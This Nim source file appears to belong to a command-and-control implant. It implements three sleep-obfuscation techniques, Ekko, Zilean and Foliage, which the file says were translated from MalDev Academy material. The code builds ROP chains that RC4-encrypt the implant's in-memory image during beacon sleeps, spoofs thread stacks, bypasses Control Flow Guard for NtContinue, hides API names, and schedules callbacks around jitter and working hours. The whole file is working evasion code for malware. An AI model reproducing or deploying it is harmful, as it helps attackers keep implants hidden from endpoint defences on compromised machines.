import winim/lean
import winim/inc/tlhelp32
import os, system, random, strformat
import ../utils/[cfg, io] 
import ../../common/[types, utils, crypto]

#[
    Different sleep obfuscation techniques, reimplemented in Nim (Ekko, Zilean, Foliage) 
    The code in this file was taken from the new MalDev Academy modules and translated from C to Nim
    
    References: 
    - https://maldevacademy.com/new/modules/54
    - https://maldevacademy.com/new/modules/55
    - https://maldevacademy.com/new/modules/56
]#

type 
    USTRING* {.bycopy.} = object 
        Length*: DWORD 
        MaximumLength*: DWORD 
        Buffer*: PVOID

    EVENT_TYPE = enum 
        NotificationEvent, 
        SynchronizationEvent

    WAIT_CALLBACK_ROUTINE = proc(Parameter: PVOID, TimerOrWaitFired: BOOLEAN): VOID 
    PWAIT_CALLBACK_ROUTINE = ptr WAIT_CALLBACK_ROUTINE

    PS_APC_ROUTINE = proc(ApcArgument1: PVOID, ApcArgument2: PVOID, ApcArgument3: PVOID): VOID
    PPS_APC_ROUTINE = ptr PS_APC_ROUTINE

# Required APIs (definitions taken from NtDoc)
type
    # Ekko/Zilean
    RtlCreateTimerQueue = proc(phTimerQueueHandle: PHANDLE): NTSTATUS {.stdcall.} 
    RtlDeleteTimerQueue = proc(hQueue: HANDLE): NTSTATUS {.stdcall.} 
    NtCreateEvent = proc(phEvent: PHANDLE, desiredAccess: ACCESS_MASK, objectAttributes: POBJECT_ATTRIBUTES, eventType: EVENT_TYPE, initialState: BOOLEAN): NTSTATUS {.stdcall.} 
    RtlCreateTimer = proc(queue: HANDLE, hTimer: PHANDLE, function: FARPROC, context: PVOID, dueTime: ULONG, period: ULONG, flags: ULONG): NTSTATUS {.stdcall.} 
    RtlRegisterWait = proc( hWait: PHANDLE, handle: HANDLE, function: PVOID, ctx: PVOID, ms: ULONG, flags: ULONG): NTSTATUS {.stdcall.}  
    NtSignalAndWaitForSingleObject = proc(hSignal: HANDLE, hWait: HANDLE, alertable: BOOLEAN, timeout: PLARGE_INTEGER): NTSTATUS {.stdcall.} 
    NtSetEvent = proc(hEvent: HANDLE, previousState: PLONG): NTSTATUS {.stdcall.} 
    NtDuplicateObject = proc(hSourceProcess: HANDLE, hSource: HANDLE, hTargetProcess: HANDLE, hTarget: PHANDLE, desiredAccess: ACCESS_MASK, attributes: ULONG, options: ULONG ): NTSTATUS {.stdcall.} 
    # Foliage 
    NtCreateThreadEx = proc(threadHandle: PHANDLE, desiredAccess: ACCESS_MASK, objectAttributes: POBJECT_ATTRIBUTES, processHandle: HANDLE, startRoutine: PVOID, argument: PVOID, createFlags: ULONG, zeroBits: ULONG, stackSize: ULONG, maximumStackSize: ULONG, attributeList: PVOID): NTSTATUS {.stdcall.} 
    NtGetContextThread = proc(threadHandle: HANDLE, context: PCONTEXT): NTSTATUS {.stdcall.} 
    NtQueueApcThread = proc(threadHandle: HANDLE, apcRoutine: PPS_APC_ROUTINE, apcArgument1: PVOID, apcArgument2: PVOID, apcArgument3: PVOID): NTSTATUS {.stdcall.} 
    NtAlertResumeThread = proc(threadHandle: HANDLE, suspendCount: PULONG): NTSTATUS {.stdcall.} 
    NtTestAlert = proc(): NTSTATUS {.stdcall.} 

    Apis = object
        RtlCreateTimerQueue: RtlCreateTimerQueue
        RtlDeleteTimerQueue: RtlDeleteTimerQueue
        NtCreateEvent: NtCreateEvent
        RtlCreateTimer: RtlCreateTimer
        RtlRegisterWait: RtlRegisterWait
        NtSignalAndWaitForSingleObject: NtSignalAndWaitForSingleObject
        NtSetEvent: NtSetEvent
        NtDuplicateObject: NtDuplicateObject
        NtCreateThreadEx: NtCreateThreadEx
        NtGetContextThread: NtGetContextThread
        NtQueueApcThread: NtQueueApcThread
        NtAlertResumeThread: NtAlertResumeThread
        NtTestAlert: NtTestAlert
        NtContinue: PVOID 
        SystemFunction032: PVOID

proc initApis(): Apis = 

    let hNtdll = GetModuleHandleA(protect("ntdll"))

    result.RtlCreateTimerQueue = cast[RtlCreateTimerQueue](GetProcAddress(hNtdll, protect("RtlCreateTimerQueue")))
    result.RtlDeleteTimerQueue = cast[RtlDeleteTimerQueue](GetProcAddress(hNtdll, protect("RtlDeleteTimerQueue")))
    result.NtCreateEvent = cast[NtCreateEvent](GetProcAddress(hNtdll, protect("NtCreateEvent")))
    result.RtlCreateTimer = cast[RtlCreateTimer](GetProcAddress(hNtdll, protect("RtlCreateTimer")))
    result.RtlRegisterWait = cast[RtlRegisterWait](GetProcAddress(hNtdll, protect("RtlRegisterWait")))
    result.NtSignalAndWaitForSingleObject = cast[NtSignalAndWaitForSingleObject](GetProcAddress(hNtdll, protect("NtSignalAndWaitForSingleObject")))
    result.NtSetEvent = cast[NtSetEvent](GetProcAddress(hNtdll, protect("NtSetEvent")))
    result.NtDuplicateObject = cast[NtDuplicateObject](GetProcAddress(hNtdll, protect("NtDuplicateObject")))
    result.NtCreateThreadEx = cast[NtCreateThreadEx](GetProcAddress(hNtdll, protect("NtCreateThreadEx")))
    result.NtGetContextThread = cast[NtGetContextThread](GetProcAddress(hNtdll, protect("NtGetContextThread")))
    result.NtQueueApcThread = cast[NtQueueApcThread](GetProcAddress(hNtdll, protect("NtQueueApcThread")))
    result.NtAlertResumeThread = cast[NtAlertResumeThread](GetProcAddress(hNtdll, protect("NtAlertResumeThread")))
    result.NtTestAlert = cast[NtTestAlert](GetProcAddress(hNtdll, protect("NtTestAlert")))
    result.NtContinue = GetProcAddress(hNtdll, protect("NtContinue"))
    result.SystemFunction032 = GetProcAddress(LoadLibraryA(protect("Advapi32")), protect("SystemFunction032"))

# Function for retrieving a random thread's thread context for stack spoofing
proc GetRandomThreadCtx(): CONTEXT = 
    var 
        ctx: CONTEXT
        hSnapshot: HANDLE
        thd32Entry: THREADENTRY32 
        hThread: HANDLE

    thd32Entry.dwSize = DWORD(sizeof(THREADENTRY32))

    # Create snapshot of all available threads
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
    if hSnapshot == INVALID_HANDLE_VALUE: 
        raise newException(CatchableError, GetLastError().getError())
    defer: CloseHandle(hSnapshot)

    if Thread32First(hSnapshot, addr thd32Entry) == FALSE: 
        raise newException(CatchableError, GetLastError().getError())
        
    while Thread32Next(hSnapshot, addr thd32Entry) != 0: 
        # Check if the thread belongs to the current process but is not the current thread
        if thd32Entry.th32OwnerProcessID == GetCurrentProcessId() and thd32Entry.th32ThreadID != GetCurrentThreadId(): 
            
            # Open handle to the thread
            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thd32Entry.th32ThreadID)
            if hThread == 0: 
                continue 
            
            # Retrieve thread context
            ctx.ContextFlags = CONTEXT_ALL # This setting is required to be able to fill the CONTEXT structure
            if GetThreadContext(hThread, addr ctx) == 0: 
                continue

            print fmt"[*] Using thread {thd32Entry.th32ThreadID} for stack spoofing."
            return ctx 
    
    print "[-] No suitable thread for stack duplication found."
    return ctx  

#[
    Ekko sleep obfuscation based on Timers API using RtlCreateTimer
]#
proc sleepEkko(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var bool = true) = 
    var 
        status: NTSTATUS = 0
        ctx: array[10, CONTEXT]
        ctxInit: CONTEXT
        ctxBackup: CONTEXT
        ctxSpoof: CONTEXT 
        hThread: HANDLE
        hEventTimer: HANDLE
        hEventStart: HANDLE
        hEventEnd: HANDLE
        queue: HANDLE
        timer: HANDLE 
        oldProtection: DWORD = 0
        delay: DWORD = 0
    
    try:
        # Create timer queue
        status = apis.RtlCreateTimerQueue(addr queue) 
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, status.getNtError())
        defer: discard apis.RtlDeleteTimerQueue(queue)

        # Create events
        status = apis.NtCreateEvent(addr hEventTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, status.getNtError())
        defer: CloseHandle(hEventTimer)

        status = apis.NtCreateEvent(addr hEventStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, status.getNtError())  
        defer: CloseHandle(hEventStart)

        status = apis.NtCreateEvent(addr hEventEnd, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, status.getNtError())
        defer: CloseHandle(hEventEnd)

        # Retrieve the initial thread context
        delay += 100
        status = apis.RtlCreateTimer(queue, addr timer, cast[PVOID](RtlCaptureContext), addr ctxInit, delay, 0, WT_EXECUTEINTIMERTHREAD)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, status.getNtError())

        # Wait until RtlCaptureContext is successfully completed to prevent a race condition from forming
        delay += 100
        status = apis.RtlCreateTimer(queue, addr timer, cast[PVOID](SetEvent), cast[PVOID](hEventTimer), delay, 0, WT_EXECUTEINTIMERTHREAD)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, status.getNtError())

        # Wait for events to finish before continuing 
        status = NtWaitForSingleObject(hEventTimer, FALSE, NULL)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, status.getNtError())

        if spoofStack: 
            # Stack duplication
            # Create handle to the current process
            # Retrieve a random thread context from the current process
            ctxSpoof = GetRandomThreadCtx() 
            if ctxSpoof == cast[CONTEXT](0): 
                # If no suitable thread is found for stack spoofing, continue without it
                spoofStack = false

        if spoofStack: 
            status = apis.NtDuplicateObject(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), addr hThread, THREAD_ALL_ACCESS, 0, 0)
            if status != STATUS_SUCCESS: 
                raise newException(CatchableError, status.getNtError())
        defer: CloseHandle(hThread)

        # Preparing the ROP chain 
        # Initially, each element in this array will have the same context as the timer's thread context
        for i in 0 ..< ctx.len(): 
            copyMem(addr ctx[i], addr ctxInit, sizeof(CONTEXT))
            dec(ctx[i].Rsp, sizeof(PVOID)) # Stack alignment, due to the RSP register being incremented by the size of a pointer
        
        var gadget = 0

        # ROP Chain
        # ctx[0] contains the call to WaitForSingleObjectEx, which waits for a signal to start and execute the rest of the chain.
        ctx[gadget].Rip = cast[DWORD64](NtWaitForSingleObject)
        ctx[gadget].Rcx = cast[DWORD64](hEventStart)
        ctx[gadget].Rdx = cast[DWORD64](FALSE)
        ctx[gadget].R8  = cast[DWORD64](NULL)
        inc gadget

        # ctx[1] contains the call to VirtualProtect, which changes the protection of the payload image memory to [RW-]
        ctx[gadget].Rip = cast[DWORD64](VirtualProtect)
        ctx[gadget].Rcx = cast[DWORD64](img.Buffer)
        ctx[gadget].Rdx = cast[DWORD64](img.Length)
        ctx[gadget].R8  = cast[DWORD64](PAGE_READWRITE)
        ctx[gadget].R9  = cast[DWORD64](addr oldProtection)
        inc gadget

        # ctx[2] contains the call to SystemFunction032, which performs the actual payload memory obfuscation using RC4.
        ctx[gadget].Rip = cast[DWORD64](apis.SystemFunction032)
        ctx[gadget].Rcx = cast[DWORD64](addr img)
        ctx[gadget].Rdx = cast[DWORD64](addr key)
        inc gadget

        if spoofStack:
            # ctx[3] contains the call to GetThreadContext, which retrieves the payload's main thread context and saves it into the CtxBackup variable for later restoration.
            ctxBackup.ContextFlags = CONTEXT_ALL
            ctx[gadget].Rip = cast[DWORD64](GetThreadContext)
            ctx[gadget].Rcx = cast[DWORD64](hThread)
            ctx[gadget].Rdx = cast[DWORD64](addr ctxBackup)
            inc gadget

            # ctx[4] contains the call to SetThreadContext that will spoof the payload thread by setting the thread context with the stolen context.
            ctx[gadget].Rip = cast[DWORD64](SetThreadContext)
            ctx[gadget].Rcx = cast[DWORD64](hThread)
            ctx[gadget].Rdx = cast[DWORD64](addr ctxSpoof)
            inc gadget

        # ctx[5] contains the call to WaitForSingleObjectEx, which delays execution and simulates sleeping until the specified timeout is reached. 
        ctx[gadget].Rip = cast[DWORD64](WaitForSingleObjectEx)
        ctx[gadget].Rcx = cast[DWORD64](GetCurrentProcess())
        ctx[gadget].Rdx = cast[DWORD64](cast[DWORD](sleepDelay))
        ctx[gadget].R8  = cast[DWORD64](FALSE)
        inc gadget
        
        # ctx[6] contains the call to SystemFunction032 to decrypt the previously encrypted payload memory
        ctx[gadget].Rip = cast[DWORD64](apis.SystemFunction032)
        ctx[gadget].Rcx = cast[DWORD64](addr img)
        ctx[gadget].Rdx = cast[DWORD64](addr key)
        inc gadget

        if spoofStack: 
            # ctx[7] calls SetThreadContext to restore the original thread context from the previously saved CtxBackup.
            ctx[gadget].Rip = cast[DWORD64](SetThreadContext)
            ctx[gadget].Rcx = cast[DWORD64](hThread)
            ctx[gadget].Rdx = cast[DWORD64](addr ctxBackup)
            inc gadget

        # ctx[8] contains the call to VirtualProtect to change the payload memory back to [R-X]
        ctx[gadget].Rip = cast[DWORD64](VirtualProtect)
        ctx[gadget].Rcx = cast[DWORD64](img.Buffer)
        ctx[gadget].Rdx = cast[DWORD64](img.Length)
        ctx[gadget].R8  = cast[DWORD64](PAGE_EXECUTE_READWRITE)
        ctx[gadget].R9  = cast[DWORD64](addr oldProtection)
        inc gadget
        
        # ctx[9] contains the call to the SetEvent WinAPI that will set hEventEnd event object in a signaled state. This with signal that the obfuscation chain is complete
        ctx[gadget].Rip = cast[DWORD64](apis.NtSetEvent)
        ctx[gadget].Rcx = cast[DWORD64](hEventEnd)
        ctx[gadget].Rdx = cast[DWORD64](NULL)

        # Executing timers
        for i in 0 .. gadget: 
            delay += 100

            status = apis.RtlCreateTimer(queue, addr timer, apis.NtContinue, addr ctx[i], delay, 0, WT_EXECUTEINTIMERTHREAD)
            if status != STATUS_SUCCESS: 
                raise newException(CatchableError, status.getNtError())
            
        print "[*] Sleep obfuscation start."

        status = apis.NtSignalAndWaitForSingleObject(hEventStart, hEventEnd, FALSE, NULL)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, status.getNtError())

        print "[*] Sleep obfuscation end."

    except CatchableError as err: 
        sleep(sleepDelay)
        print "[-] ", err.msg


#[
    Zilean sleep obfuscation based on Timers API using RtlRegisterWait
]#
proc sleepZilean(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var bool = true) = 
    var 
        status: NTSTATUS = 0
        ctx: array[10, CONTEXT]
        ctxInit: CONTEXT
        ctxBackup: CONTEXT
        ctxSpoof: CONTEXT 
        hThread: HANDLE
        hEventTimer: HANDLE
        hEventWait: HANDLE
        hEventStart: HANDLE
        hEventEnd: HANDLE
        timer: HANDLE 
        oldProtection: DWORD = 0
        delay: DWORD = 0

    try: 
        # Create events
        status = apis.NtCreateEvent(addr hEventTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, status.getNtError())
        defer: CloseHandle(hEventTimer)

        status = apis.NtCreateEvent(addr hEventWait, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, status.getNtError())
        defer: CloseHandle(hEventWait)

        status = apis.NtCreateEvent(addr hEventStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, status.getNtError())
        defer: CloseHandle(hEventStart)    

        status = apis.NtCreateEvent(addr hEventEnd, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, status.getNtError())
        defer: CloseHandle(hEventEnd)

        delay += 100
        status = apis.RtlRegisterWait(addr timer, hEventWait, cast[PWAIT_CALLBACK_ROUTINE](RtlCaptureContext), addr ctxInit, delay, WT_EXECUTEONLYONCE or WT_EXECUTEINWAITTHREAD)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, status.getNtError())

        delay += 100
        status = apis.RtlRegisterWait(addr timer, hEventWait, cast[PWAIT_CALLBACK_ROUTINE](SetEvent), cast[PVOID](hEventTimer), delay, WT_EXECUTEONLYONCE or WT_EXECUTEINWAITTHREAD)
        if status != STATUS_SUCCESS:
            raise newException(CatchableError, status.getNtError())

        # Wait for events to finish before continuing 
        status = NtWaitForSingleObject(hEventTimer, FALSE, NULL)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, status.getNtError())

        if spoofStack: 
            # Stack duplication
            # Create handle to the current process
            # Retrieve a random thread context from the current process
            ctxSpoof = GetRandomThreadCtx() 
            if ctxSpoof == cast[CONTEXT](0): 
                # If no suitable thread is found for stack spoofing, continue without it
                spoofStack = false

        if spoofStack: 
            status = apis.NtDuplicateObject(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), addr hThread, THREAD_ALL_ACCESS, 0, 0)
            if status != STATUS_SUCCESS: 
                raise newException(CatchableError, status.getNtError())
        defer: CloseHandle(hThread)

        # Preparing the ROP chain 
        # Initially, each element in this array will have the same context as the timer's thread context
        for i in 0 ..< ctx.len(): 
            copyMem(addr ctx[i], addr ctxInit, sizeof(CONTEXT))
            dec(ctx[i].Rsp, sizeof(PVOID)) # Stack alignment, due to the RSP register being incremented by the size of a pointer
        
        var gadget = 0

        # ROP Chain
        # ctx[0] contains the call to WaitForSingleObjectEx, which waits for a signal to start and execute the rest of the chain.
        ctx[gadget].Rip = cast[DWORD64](NtWaitForSingleObject)
        ctx[gadget].Rcx = cast[DWORD64](hEventStart)
        ctx[gadget].Rdx = cast[DWORD64](FALSE)
        ctx[gadget].R8  = cast[DWORD64](NULL)
        inc gadget

        # ctx[1] contains the call to VirtualProtect, which changes the protection of the payload image memory to [RW-]
        ctx[gadget].Rip = cast[DWORD64](VirtualProtect)
        ctx[gadget].Rcx = cast[DWORD64](img.Buffer)
        ctx[gadget].Rdx = cast[DWORD64](img.Length)
        ctx[gadget].R8  = cast[DWORD64](PAGE_READWRITE)
        ctx[gadget].R9  = cast[DWORD64](addr oldProtection)
        inc gadget

        # ctx[2] contains the call to SystemFunction032, which performs the actual payload memory obfuscation using RC4.
        ctx[gadget].Rip = cast[DWORD64](apis.SystemFunction032)
        ctx[gadget].Rcx = cast[DWORD64](addr img)
        ctx[gadget].Rdx = cast[DWORD64](addr key)
        inc gadget

        if spoofStack:
            # ctx[3] contains the call to GetThreadContext, which retrieves the payload's main thread context and saves it into the CtxBackup variable for later restoration.
            ctxBackup.ContextFlags = CONTEXT_ALL
            ctx[gadget].Rip = cast[DWORD64](GetThreadContext)
            ctx[gadget].Rcx = cast[DWORD64](hThread)
            ctx[gadget].Rdx = cast[DWORD64](addr ctxBackup)
            inc gadget

            # ctx[4] contains the call to SetThreadContext that will spoof the payload thread by setting the thread context with the stolen context.
            ctx[gadget].Rip = cast[DWORD64](SetThreadContext)
            ctx[gadget].Rcx = cast[DWORD64](hThread)
            ctx[gadget].Rdx = cast[DWORD64](addr ctxSpoof)
            inc gadget

        # ctx[5] contains the call to WaitForSingleObjectEx, which delays execution and simulates sleeping until the specified timeout is reached. 
        ctx[gadget].Rip = cast[DWORD64](WaitForSingleObjectEx)
        ctx[gadget].Rcx = cast[DWORD64](GetCurrentProcess())
        ctx[gadget].Rdx = cast[DWORD64](cast[DWORD](sleepDelay))
        ctx[gadget].R8  = cast[DWORD64](FALSE)
        inc gadget
        
        # ctx[6] contains the call to SystemFunction032 to decrypt the previously encrypted payload memory
        ctx[gadget].Rip = cast[DWORD64](apis.SystemFunction032)
        ctx[gadget].Rcx = cast[DWORD64](addr img)
        ctx[gadget].Rdx = cast[DWORD64](addr key)
        inc gadget

        if spoofStack: 
            # ctx[7] calls SetThreadContext to restore the original thread context from the previously saved CtxBackup.
            ctx[gadget].Rip = cast[DWORD64](SetThreadContext)
            ctx[gadget].Rcx = cast[DWORD64](hThread)
            ctx[gadget].Rdx = cast[DWORD64](addr ctxBackup)
            inc gadget

        # ctx[8] contains the call to VirtualProtect to change the payload memory back to [R-X]
        ctx[gadget].Rip = cast[DWORD64](VirtualProtect)
        ctx[gadget].Rcx = cast[DWORD64](img.Buffer)
        ctx[gadget].Rdx = cast[DWORD64](img.Length)
        ctx[gadget].R8  = cast[DWORD64](PAGE_EXECUTE_READWRITE)
        ctx[gadget].R9  = cast[DWORD64](addr oldProtection)
        inc gadget
        
        # ctx[9] contains the call to the SetEvent WinAPI that will set hEventEnd event object in a signaled state. This with signal that the obfuscation chain is complete
        ctx[gadget].Rip = cast[DWORD64](apis.NtSetEvent)
        ctx[gadget].Rcx = cast[DWORD64](hEventEnd)
        ctx[gadget].Rdx = cast[DWORD64](NULL)

        # Executing timers
        for i in 0 .. gadget: 
            delay += 100
            status = apis.RtlRegisterWait(addr timer, hEventWait, cast[PWAIT_CALLBACK_ROUTINE](apis.NtContinue), addr ctx[i], delay, WT_EXECUTEONLYONCE or WT_EXECUTEINWAITTHREAD)
            if status != STATUS_SUCCESS: 
                raise newException(CatchableError, status.getNtError())

        print "[*] Sleep obfuscation start."

        status = apis.NtSignalAndWaitForSingleObject(hEventStart, hEventEnd, FALSE, NULL)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, status.getNtError())

        print "[*] Sleep obfuscation end."

    except CatchableError as err: 
        sleep(sleepDelay)
        print "[-] ", err.msg
        

#[
    Foliage sleep obfuscation based on Asynchronous Procedure Calls
]#
proc sleepFoliage(apis: Apis, key, img: USTRING, sleepDelay: int) = 
    var 
        status: NTSTATUS = 0
        ctx: array[7, CONTEXT]
        ctxInit: CONTEXT
        hEventSync: HANDLE 
        oldProtection: ULONG 
        hThread: HANDLE 
        
    try: 
        # Start synchronization event 
        status = apis.NtCreateEvent(addr hEventSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, status.getNtError())
        defer: CloseHandle(hEventSync)
            
        # Start suspended thread where the APC calls will be queued and executed
        status = apis.NtCreateThreadEx(addr hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, status.getNtError())
        print fmt"[*] [{hThread.repr}] Thread created "
        defer: CloseHandle(hThread)

        ctxInit.ContextFlags = CONTEXT_FULL
        status = apis.NtGetContextThread(hThread, addr ctxInit)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, status.getNtError())

        # NtTestAlert is used to check if any user-mode APCs are pending for the calling thread and, if so, execute them.
        # NtTestAlert will trigger all queued APC calls until the last element in the obfuscation chain, where ExitThread is called, terminating the thread.
        cast[ptr PVOID](ctxInit.Rsp)[] = cast[PVOID](apis.NtTestAlert)

        # Preparing the ROP chain
        for i in 0 ..< ctx.len(): 
            copyMem(addr ctx[i], addr ctxInit, sizeof(CONTEXT))
        
        var gadget = 0

        # ctx[0] contains a call to NtWaitForSingleObject, which waits for a synchronization signal to be triggered.
        ctx[gadget].Rip = cast[DWORD64](NtWaitForSingleObject)
        ctx[gadget].Rcx = cast[DWORD64](hEventSync)
        ctx[gadget].Rdx = cast[DWORD64](FALSE)
        ctx[gadget].R8  = cast[DWORD64](NULL)
        inc gadget

        # ctx[1] contains the call to VirtualProtect, which changes the protection of the payload image memory to [RW-]
        ctx[gadget].Rip = cast[DWORD64](VirtualProtect)
        ctx[gadget].Rcx = cast[DWORD64](img.Buffer)
        ctx[gadget].Rdx = cast[DWORD64](img.Length)
        ctx[gadget].R8  = cast[DWORD64](PAGE_READWRITE)
        ctx[gadget].R9  = cast[DWORD64](addr oldProtection)
        inc gadget

        # ctx[2] contains the call to SystemFunction032, which performs the actual payload memory obfuscation using RC4.
        ctx[gadget].Rip = cast[DWORD64](apis.SystemFunction032)
        ctx[gadget].Rcx = cast[DWORD64](addr img)
        ctx[gadget].Rdx = cast[DWORD64](addr key)
        inc gadget

        # ctx[3] contains the call to WaitForSingleObjectEx, which delays execution and simulates sleeping until the specified timeout is reached. 
        ctx[gadget].Rip = cast[DWORD64](WaitForSingleObjectEx)
        ctx[gadget].Rcx = cast[DWORD64](GetCurrentProcess())
        ctx[gadget].Rdx = cast[DWORD64](cast[DWORD](sleepDelay))
        ctx[gadget].R8  = cast[DWORD64](FALSE)
        inc gadget
        
        # ctx[4] contains the call to SystemFunction032 to decrypt the previously encrypted payload memory
        ctx[gadget].Rip = cast[DWORD64](apis.SystemFunction032)
        ctx[gadget].Rcx = cast[DWORD64](addr img)
        ctx[gadget].Rdx = cast[DWORD64](addr key)
        inc gadget

        # ctx[5] contains the call to VirtualProtect to change the payload memory back to [R-X]
        ctx[gadget].Rip = cast[DWORD64](VirtualProtect)
        ctx[gadget].Rcx = cast[DWORD64](img.Buffer)
        ctx[gadget].Rdx = cast[DWORD64](img.Length)
        ctx[gadget].R8  = cast[DWORD64](PAGE_EXECUTE_READWRITE)
        ctx[gadget].R9  = cast[DWORD64](addr oldProtection)
        inc gadget
        
        # ctx[6] contains the final call, which exits the created thread after all APC calls have been executed.
        ctx[gadget].Rip = cast[DWORD64](winbase.ExitThread)
        ctx[gadget].Rcx = cast[DWORD64](0)

        # Queueing the chain 
        for i in 0 .. gadget: 
            status = apis.NtQueueApcThread(hThread, cast[PPS_APC_ROUTINE](apis.NtContinue), addr ctx[i], cast[PVOID](FALSE), NULL)
            if status != STATUS_SUCCESS: 
                raise newException(CatchableError, status.getNtError())
        
        # Start sleep obfuscation
        status = apis.NtAlertResumeThread(hThread, NULL)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, status.getNtError())

        print "[*] Sleep obfuscation start."

        status = apis.NtSignalAndWaitForSingleObject(hEventSync, hThread, TRUE, NULL)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, status.getNtError())
    
        print "[*] Sleep obfuscation end."

    except CatchableError as err: 
        sleep(sleepDelay)
        print "[-] ", err.msg


# Function to determine whether the agent currently operates within the configured working hours
proc withinWorkingHours(workingHours: WorkingHours): bool =     
    var time: SYSTEMTIME
    GetLocalTime(addr time)

    if int(time.wHour) < workingHours.startHour or int(time.wHour) > workingHours.endHour: 
        return false 

    if int(time.wHour) == workingHours.startHour and int(time.wMinute) < workingHours.startMinute: 
        return false 

    if int(time.wHour) == workingHours.endHour and int(time.wMinute) > workingHours.endMinute:
        return false

    return true 

# Sleep obfuscation implemented in various techniques
proc sleepObfuscate*(sleepSettings: SleepSettings) = 
    
    if sleepSettings.sleepDelay == 0: 
        return 

    # Initialize required API functions 
    let apis = initApis() 

    # Calculate actual sleep delay with jitter
    let minDelay = float(sleepSettings.sleepDelay) - (float(sleepSettings.sleepDelay) * (float(sleepSettings.jitter) / 100.0f)) 
    let maxDelay = float(sleepSettings.sleepDelay) + (float(sleepSettings.sleepDelay) * (float(sleepSettings.jitter) / 100.0f)) 
    
    var delay = int(rand(minDelay .. maxDelay) * 1000)

    # Working hours
    # https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Obf.c#L650
    # If the local time is outside of the agent's working hours, we calculate the required sleep delay until the start of the next work day.
    if sleepSettings.workingHours.enabled and not withinWorkingHours(sleepSettings.workingHours): 
        print "[*] Agent is outside of working hours."
        delay = 0

        # Get current time
        var time: SYSTEMTIME
        GetLocalTime(addr time)
    
        let minutesSinceMidnight = int(time.wHour) * 60 + int(time.wMinute) 
        let minutesUntilWorkday = sleepSettings.workingHours.startHour * 60 + sleepSettings.workingHours.startMinute

        if minutesSinceMidnight < minutesUntilWorkday: 
            # We are on the same day as the start of the work day: calculate the difference between the two timestamps
            delay = int((minutesUntilWorkday - minutesSinceMidnight) * 60 - int(time.wSecond)) * 1000

        else: 
            # Calculate minutes until midnight and add the minutes until the start of the workday
            delay = int(((24 * 60 - minutesSinceMidnight) + minutesUntilWorkday) * 60 - int(time.wSecond)) * 1000

    print fmt"[*] Sleepmask settings: Technique: {$sleepSettings.sleepTechnique}, Delay: {$delay}ms, Stack spoofing: {$sleepSettings.spoofStack}"

    var img: USTRING = USTRING(Length: 0)
    var key: USTRING = USTRING(Length: 0)

    # Add NtContinue to the Control Flow Guard allow list to make Ekko work in processes protected by CFG
    discard evadeCFG(apis.NtContinue)

    # Locate image base and size
    var imageBase = GetModuleHandleA(NULL)
    var imageSize = (cast[PIMAGE_NT_HEADERS](imageBase + (cast[PIMAGE_DOS_HEADER](imageBase)).e_lfanew)).OptionalHeader.SizeOfImage
    img.Buffer = cast[PVOID](imageBase)
    img.Length = imageSize

    # Generate random encryption key
    var keyBuffer: string = Bytes.toString(generateBytes(KeyRC4)) 
    key.Buffer = addr keyBuffer
    key.Length = cast[DWORD](keyBuffer.len())

    # Execute sleep obfuscation technique
    case sleepSettings.sleepTechnique:
    of EKKO: 
        sleepEkko(apis, key, img, delay, sleepSettings.spoofStack)
    of ZILEAN: 
        sleepZilean(apis, key, img, delay, sleepSettings.spoofStack)
    of FOLIAGE:
        sleepFoliage(apis, key, img, delay)
    of NONE:
        sleep(delay)
